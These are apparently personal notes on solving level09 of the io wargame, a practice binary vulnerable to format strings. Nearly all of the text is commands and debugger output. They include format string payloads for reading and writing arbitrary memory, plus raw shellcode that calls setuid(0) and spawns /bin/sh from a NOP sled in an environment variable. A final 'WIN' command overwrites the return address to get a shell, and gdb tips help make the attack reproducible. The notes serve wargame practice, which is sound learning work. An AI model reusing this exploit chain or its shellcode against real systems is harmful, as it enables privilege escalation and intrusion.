good paper: https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf

good blog post: http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

To read arbitrary memory (say from the environment variable area):
```
level9@io:/tmp/maxblevelztesting9$ /levels/level09 $(python -c "print '\xa0\xfe\xff\xbfAAA1_%08x.%08x.%08x.%s'")
����AAA1_bffffe20.000003ff.00000000._PATH=/usr/local/radare/lib/level9@io:/tmp/maxblevelztesting9$
```

To write arbitrarily to memory
```
level9@io:/tmp/maxblevelztesting9$ /levels/level09 $(python -c "print '\xa0\xfe\xff\xbfAAA1_%08x.%08x.%08x.%n'")
```
will write the integer `24` to 0xbffffea0 (where `24` is the number of bytes written by printf)

```
(venv) ~/w/r/c/io ❯❯❯ echo "dcu 0x080483ee; px 0x20 @ 0xffffccee " | r2 -Raslr=no -d ./level09 "$(python -c 'print "'"\xf0\xcc\xff\xff\xee\xcc\xff\xff %49141x%4\$hn%16384x%5\$hn"'"')" 2>&1 | tail -n 5
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffccee  ffff ffbf 0000 0000 0000 0020 faf7 5a57  ........... ..ZW
0xffffccfe  fef7 00d0 fff7 0000 0000 0020 faf7 0000  ........... ....
```

return address is at 0xbffff7fc, so we want to overwrite that w/ the address of our exploit from the environment variables
```
level8@io:~$ export NOP_AND_SHELLCODE=$(python -c "print '\x90' * 1024 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
level9@io:~$ gdb /levels/level09
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /levels/level09...done.
(gdb) b main
Breakpoint 1 at 0x80483ad
(gdb) run AAAA
Starting program: /levels/level09 AAAA

Breakpoint 1, 0x080483ad in main ()
(gdb)  x/s *((char **)environ)
0xbffffa03:	"XDG_SESSION_ID=310301"
(gdb) x/10w 0xbffffd23
0xbffffd23:	U'\x90909090' <repeats 157 times>, "\xdb31c031\x80cd17b0\x895e1feb\xc0310876\x89074688\xbb00c46\x4e8df389\xc568d08\xdb3180cd\xcd40d889\xffdce880\x622fffff\x732f6e69\x44580068\x55525f47\x4d49544e\x49445f45\x722f3d52\x752f6e75\x2f726573\x39303031\x656c2f00\x736c6576\x76656c2f\x39306c65"
```

current attempt:
```
/levels/level09 "$(python -c 'print "'"\xfe\xf7\xff\xbf\xfc\xf7\xff\xbf %49142x%4\$hn%15652x%5\$hn"'"')"
```
*should* write 0xbffffd23 (place where our environment variable NOP slide is) to 0xbffff7fc (where we think the return pointer location is)

WIN:
```
env -i PWD="/tmp/maxblevelztesting9" SHELL="/bin/bash" SHLVL=0 NOP_AND_SHELLCODE=$(python -c "print '\x90' * 1024 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'") /levels/level09 "$(python -c 'print "'"\xbe\xf9\xff\xbf\xbc\xf9\xff\xbf %49142x%4\$hn%15652x%5\$hn"'"')"
```

The trick was setting up gdb to be identical to running it normally
https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it

```
env -i PWD="/tmp/maxblevelztesting9" SHELL="/bin/bash" SHLVL=0 NOP_AND_SHELLCODE=$(python -c "print '\x90' * 1024 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'") gdb /levels/level09
$ unset env LINES
$ unset env COLUMNS
```
then you can debug through it to find the return address location you want to overwrite 🎆
